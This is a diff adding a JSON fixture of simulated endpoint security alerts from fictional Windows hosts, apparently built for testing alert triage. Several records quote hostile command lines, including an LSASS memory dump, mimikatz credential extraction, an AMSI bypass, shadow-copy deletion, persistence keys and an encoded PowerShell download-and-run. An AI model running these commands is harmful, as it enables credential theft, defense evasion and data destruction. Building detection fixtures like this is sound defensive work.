@@ -1,0 +1,1523 @@
+[
+  {
+    "@timestamp": "2023-01-16T02:15:12.500Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "info",
+        "allowed"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 21,
+      "risk_score": 21,
+      "created": "2023-01-16T02:15:12.500Z",
+      "ingested": "2023-01-16T02:15:13.500Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-ADMIN-01",
+      "hostname": "WIN-ADMIN-01",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "Administrator",
+      "domain": "ACME"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "pid": 4120,
+      "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass"
+    },
+    "rule": {
+      "name": "Suspicious PowerShell Execution via ExecutionPolicy Bypass",
+      "id": "a7f3b2c1-4e5d-4a6f-8b9c-0d1e2f3a4b5c",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: powershell.exe launched with -ExecutionPolicy Bypass and -NoProfile flags \u2014 potential policy circumvention"
+  },
+  {
+    "@timestamp": "2023-01-16T02:17:47.500Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "info",
+        "allowed"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 21,
+      "risk_score": 21,
+      "created": "2023-01-16T02:17:47.500Z",
+      "ingested": "2023-01-16T02:17:48.500Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-ADMIN-01",
+      "hostname": "WIN-ADMIN-01",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "Administrator",
+      "domain": "ACME"
+    },
+    "process": {
+      "name": "schtasks.exe",
+      "pid": 5200,
+      "command_line": "schtasks.exe /Create /TN ACME-Inventory-Weekly /SC WEEKLY /D SUN /RU SYSTEM /F"
+    },
+    "rule": {
+      "name": "Scheduled Task Created via Command Line",
+      "id": "b8c4d3e2-5f6a-4b7c-9d0e-1f2a3b4c5d6e",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: schtasks.exe used to register a new scheduled task \u2014 common persistence technique"
+  },
+  {
+    "@timestamp": "2023-01-16T02:20:33.500Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "info",
+        "allowed"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 47,
+      "risk_score": 47,
+      "created": "2023-01-16T02:20:33.500Z",
+      "ingested": "2023-01-16T02:20:34.500Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-ADMIN-02",
+      "hostname": "WIN-ADMIN-02",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "svc_backup",
+      "domain": "ACME"
+    },
+    "process": {
+      "name": "vssadmin.exe",
+      "pid": 3320,
+      "command_line": "vssadmin.exe delete shadows /all /quiet"
+    },
+    "rule": {
+      "name": "Volume Shadow Copy Deletion via VSSAdmin",
+      "id": "c9d5e4f3-6a7b-4c8d-0e1f-2a3b4c5d6e7f",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: vssadmin.exe invoked with shadow delete arguments \u2014 frequently observed in ransomware pre-staging"
+  },
+  {
+    "@timestamp": "2023-01-16T03:05:02.500Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "info",
+        "allowed"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 47,
+      "risk_score": 47,
+      "created": "2023-01-16T03:05:02.500Z",
+      "ingested": "2023-01-16T03:05:03.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-OPS-01",
+      "hostname": "WIN-OPS-01",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "it_ops",
+      "domain": "ACME"
+    },
+    "process": {
+      "name": "psexec.exe",
+      "pid": 6100,
+      "command_line": "psexec.exe WIN-FILES-01 -accepteula -s cmd.exe /c whoami"
+    },
+    "rule": {
+      "name": "PsExec Remote Execution Tool Detected",
+      "id": "d0e6f5a4-7b8c-4d9e-1f2a-3b4c5d6e7f8a",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: psexec.exe execution detected \u2014 commonly used for lateral movement and remote administration"
+  },
+  {
+    "@timestamp": "2023-01-16T03:06:12.500Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "info",
+        "allowed"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 21,
+      "risk_score": 21,
+      "created": "2023-01-16T03:06:12.500Z",
+      "ingested": "2023-01-16T03:06:13.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-OPS-01",
+      "hostname": "WIN-OPS-01",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "it_ops",
+      "domain": "ACME"
+    },
+    "process": {
+      "name": "wmic.exe",
+      "pid": 6200,
+      "command_line": "wmic /node:WIN-FILES-01 process list brief"
+    },
+    "rule": {
+      "name": "Remote Process Execution via WMI Command Line",
+      "id": "e1f7a6b5-8c9d-4e0f-2a3b-4c5d6e7f8a9b",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: wmic.exe executed with remote node and process call arguments \u2014 potential WMI-based lateral movement"
+  },
+  {
+    "@timestamp": "2023-01-16T03:08:32.500Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "info",
+        "allowed"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 21,
+      "risk_score": 21,
+      "created": "2023-01-16T03:08:32.500Z",
+      "ingested": "2023-01-16T03:08:33.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-DEV-01",
+      "hostname": "WIN-DEV-01",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "dev_user",
+      "domain": "ACME"
+    },
+    "process": {
+      "name": "rundll32.exe",
+      "pid": 3300,
+      "command_line": "rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl"
+    },
+    "rule": {
+      "name": "Suspicious RunDLL32 Execution with Unusual Arguments",
+      "id": "f2a8b7c6-9d0e-4f1a-3b4c-5d6e7f8a9b0c",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: rundll32.exe launched with arguments that do not match known legitimate invocation patterns"
+  },
+  {
+    "@timestamp": "2023-01-16T10:05:03.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 98,
+      "risk_score": 98,
+      "created": "2023-01-16T10:05:03.000Z",
+      "ingested": "2023-01-16T10:05:04.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-01",
+      "hostname": "WIN-WS-01",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "notepad.exe",
+      "pid": 7200,
+      "command_line": "notepad.exe"
+    },
+    "rule": {
+      "name": "Shellcode Injection into Remote Process",
+      "id": "attack-shellcode-1",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Prevention Alert: Shellcode injection detected in notepad.exe"
+  },
+  {
+    "@timestamp": "2023-01-16T10:12:15.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 98,
+      "risk_score": 98,
+      "created": "2023-01-16T10:12:15.000Z",
+      "ingested": "2023-01-16T10:12:16.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-01",
+      "hostname": "WIN-WS-01",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "svchost.exe",
+      "pid": 8800,
+      "command_line": "svchost.exe -k netsvcs"
+    },
+    "rule": {
+      "name": "Remote Thread Injection via CreateRemoteThread",
+      "id": "attack-shellcode-2",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Prevention Alert: CreateRemoteThread used to inject code into svchost.exe"
+  },
+  {
+    "@timestamp": "2023-01-16T11:30:08.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "credential_access"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 98,
+      "risk_score": 98,
+      "created": "2023-01-16T11:30:08.000Z",
+      "ingested": "2023-01-16T11:30:09.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-02",
+      "hostname": "WIN-WS-02",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "procdump64.exe",
+      "pid": 9100,
+      "command_line": "procdump64.exe -accepteula -ma lsass.exe lsass.dmp"
+    },
+    "rule": {
+      "name": "LSASS Memory Dump via ProcDump",
+      "id": "attack-lsass-1",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Prevention Alert: LSASS process memory dumped using ProcDump"
+  },
+  {
+    "@timestamp": "2023-01-16T11:35:44.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "credential_access"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 98,
+      "risk_score": 98,
+      "created": "2023-01-16T11:35:44.000Z",
+      "ingested": "2023-01-16T11:35:45.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-02",
+      "hostname": "WIN-WS-02",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "mimikatz.exe",
+      "pid": 9200,
+      "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"
+    },
+    "rule": {
+      "name": "Mimikatz Credential Harvesting",
+      "id": "attack-mimikatz-1",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Prevention Alert: Mimikatz detected extracting credentials from LSASS"
+  },
+  {
+    "@timestamp": "2023-01-16T13:00:11.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "lateral_movement"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 74,
+      "risk_score": 74,
+      "created": "2023-01-16T13:00:11.000Z",
+      "ingested": "2023-01-16T13:00:12.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-03",
+      "hostname": "WIN-WS-03",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "wmic.exe",
+      "pid": 5500,
+      "command_line": "wmic /node:WIN-DC-01 process call create cmd.exe /c whoami"
+    },
+    "rule": {
+      "name": "Lateral Movement via WMI Remote Process Creation",
+      "id": "attack-wmi-lateral-1",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Prevention Alert: WMI used to create a process on a remote host"
+  },
+  {
+    "@timestamp": "2023-01-16T13:08:30.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "lateral_movement"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 74,
+      "risk_score": 74,
+      "created": "2023-01-16T13:08:30.000Z",
+      "ingested": "2023-01-16T13:08:31.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-DC-01",
+      "hostname": "WIN-DC-01",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "cmd.exe",
+      "pid": 6600,
+      "command_line": "cmd.exe /c net user /domain"
+    },
+    "rule": {
+      "name": "Suspicious Command Execution via Remote WMI",
+      "id": "attack-wmi-lateral-2",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Prevention Alert: Suspicious cmd.exe spawned remotely via WMI on domain controller"
+  },
+  {
+    "@timestamp": "2023-01-16T14:20:05.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "persistence"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 74,
+      "risk_score": 74,
+      "created": "2023-01-16T14:20:05.000Z",
+      "ingested": "2023-01-16T14:20:06.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-04",
+      "hostname": "WIN-WS-04",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "reg.exe",
+      "pid": 4400,
+      "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\jsmith\\AppData\\Roaming\\updater.exe /f"
+    },
+    "rule": {
+      "name": "Registry Run Key Added for Persistence",
+      "id": "attack-persist-reg-1",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Prevention Alert: Run key added to registry for persistence"
+  },
+  {
+    "@timestamp": "2023-01-16T14:25:18.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "persistence"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 74,
+      "risk_score": 74,
+      "created": "2023-01-16T14:25:18.000Z",
+      "ingested": "2023-01-16T14:25:19.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-04",
+      "hostname": "WIN-WS-04",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "schtasks.exe",
+      "pid": 4500,
+      "command_line": "schtasks /create /tn WindowsUpdaterTask /tr C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.exe /sc onlogon /ru SYSTEM /f"
+    },
+    "rule": {
+      "name": "Malicious Scheduled Task for Persistence",
+      "id": "attack-persist-schtask-1",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Prevention Alert: Scheduled task created to run payload on logon as SYSTEM"
+  },
+  {
+    "@timestamp": "2023-01-16T15:45:22.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "defense_evasion"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 98,
+      "risk_score": 98,
+      "created": "2023-01-16T15:45:22.000Z",
+      "ingested": "2023-01-16T15:45:23.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-05",
+      "hostname": "WIN-WS-05",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "svchost.exe",
+      "pid": 5100,
+      "command_line": "svchost.exe -k netsvcs -p -s wuauserv"
+    },
+    "rule": {
+      "name": "Process Hollowing Detected in svchost",
+      "id": "attack-hollow-1",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Prevention Alert: Process hollowing detected \u2014 svchost.exe memory replaced with malicious image"
+  },
+  {
+    "@timestamp": "2023-01-16T15:50:44.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "defense_evasion"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 74,
+      "risk_score": 74,
+      "created": "2023-01-16T15:50:44.000Z",
+      "ingested": "2023-01-16T15:50:45.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-05",
+      "hostname": "WIN-WS-05",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "pid": 5200,
+      "command_line": "powershell.exe -exec bypass -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+    },
+    "rule": {
+      "name": "AMSI Bypass via Reflection",
+      "id": "attack-amsi-1",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Prevention Alert: AMSI bypass attempted via PowerShell reflection"
+  },
+  {
+    "@timestamp": "2023-01-16T17:10:09.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "collection"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 74,
+      "risk_score": 74,
+      "created": "2023-01-16T17:10:09.000Z",
+      "ingested": "2023-01-16T17:10:10.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-06",
+      "hostname": "WIN-WS-06",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "pid": 6300,
+      "command_line": "powershell.exe Compress-Archive -Path C:\\Users\\jsmith\\Documents -DestinationPath C:\\Windows\\Temp\\docs.zip"
+    },
+    "rule": {
+      "name": "Sensitive Data Staged for Exfiltration",
+      "id": "attack-collect-1",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: User documents compressed and staged in system temp directory"
+  },
+  {
+    "@timestamp": "2023-01-16T17:18:55.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "collection"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 74,
+      "risk_score": 74,
+      "created": "2023-01-16T17:18:55.000Z",
+      "ingested": "2023-01-16T17:18:56.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-06",
+      "hostname": "WIN-WS-06",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "chrome.exe",
+      "pid": 6400,
+      "command_line": "chrome.exe --remote-debugging-port=9222"
+    },
+    "rule": {
+      "name": "Browser Credential Theft via Remote Debug Port",
+      "id": "attack-collect-2",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: Chrome launched with remote debugging enabled for credential theft"
+  },
+  {
+    "@timestamp": "2023-01-16T19:30:17.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "command_and_control"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 98,
+      "risk_score": 98,
+      "created": "2023-01-16T19:30:17.000Z",
+      "ingested": "2023-01-16T19:30:18.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-07",
+      "hostname": "WIN-WS-07",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "svchost.exe",
+      "pid": 8100,
+      "command_line": "svchost.exe -k netsvcs"
+    },
+    "rule": {
+      "name": "Cobalt Strike Beacon Detected",
+      "id": "attack-c2-beacon-1",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Prevention Alert: Cobalt Strike beacon pattern detected in network traffic from svchost.exe"
+  },
+  {
+    "@timestamp": "2023-01-16T19:35:42.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "command_and_control"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 98,
+      "risk_score": 98,
+      "created": "2023-01-16T19:35:42.000Z",
+      "ingested": "2023-01-16T19:35:43.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-07",
+      "hostname": "WIN-WS-07",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "pid": 8200,
+      "command_line": "powershell.exe -w hidden -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQAJwApAA=="
+    },
+    "rule": {
+      "name": "Encoded PowerShell Downloading Remote Payload",
+      "id": "attack-c2-dl-1",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Prevention Alert: PowerShell downloading and executing remote payload via encoded command"
+  },
+  {
+    "@timestamp": "2023-01-16T22:00:05.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "impact"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 98,
+      "risk_score": 98,
+      "created": "2023-01-16T22:00:05.000Z",
+      "ingested": "2023-01-16T22:00:06.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-08",
+      "hostname": "WIN-WS-08",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "vssadmin.exe",
+      "pid": 9900,
+      "command_line": "vssadmin delete shadows /all /quiet"
+    },
+    "rule": {
+      "name": "Shadow Copy Deletion Prior to Ransomware",
+      "id": "attack-ransom-vss-1",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Prevention Alert: Shadow copy deletion detected \u2014 likely ransomware pre-encryption step"
+  },
+  {
+    "@timestamp": "2023-01-16T22:05:30.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "impact"
+      ],
+      "type": [
+        "denied"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 98,
+      "risk_score": 98,
+      "created": "2023-01-16T22:05:30.000Z",
+      "ingested": "2023-01-16T22:05:31.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-WS-08",
+      "hostname": "WIN-WS-08",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "jsmith",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "ransomware.exe",
+      "pid": 10100,
+      "command_line": "ransomware.exe --encrypt C:\\Users --ext .locked --ransom-note README_LOCKED.txt"
+    },
+    "rule": {
+      "name": "Mass File Encryption by Ransomware",
+      "id": "attack-ransom-enc-1",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Prevention Alert: Mass file encryption detected \u2014 ransomware actively encrypting user data"
+  },
+  {
+    "@timestamp": "2023-01-16T04:10:05.000Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "malware",
+        "intrusion_detection"
+      ],
+      "type": [
+        "info",
+        "allowed"
+      ],
+      "action": "rule_detection",
+      "module": "endpoint",
+      "dataset": "endpoint.alerts",
+      "severity": 47,
+      "risk_score": 47,
+      "created": "2023-01-16T04:10:05.000Z",
+      "ingested": "2023-01-16T04:10:06.000Z",
+      "outcome": "success"
+    },
+    "data_stream": {
+      "type": "logs",
+      "dataset": "endpoint.alerts",
+      "namespace": "default"
+    },
+    "host": {
+      "name": "WIN-DEV-03",
+      "hostname": "WIN-DEV-03",
+      "os": {
+        "family": "windows",
+        "type": "windows",
+        "name": "Windows",
+        "version": "10.0.19045"
+      },
+      "architecture": "x86_64"
+    },
+    "user": {
+      "name": "svc_crashdump",
+      "domain": "CORP"
+    },
+    "process": {
+      "name": "procdump64.exe",
+      "pid": 3310,
+      "command_line": "procdump64.exe -accepteula -ma chrome.exe C:\\CrashDumps\\chrome_20230116.dmp"
+    },
+    "rule": {
+      "name": "Process Memory Dump via ProcDump Utility",
+      "id": "a3b9c8d7-0e1f-4a2b-4c5d-6e7f8a9b0c1d",
+      "version": "1.0.0"
+    },
+    "message": "Malicious Behavior Detection Alert: procdump64.exe executed with full-memory dump flag \u2014 technique used for credential harvesting from LSASS and other sensitive processes"
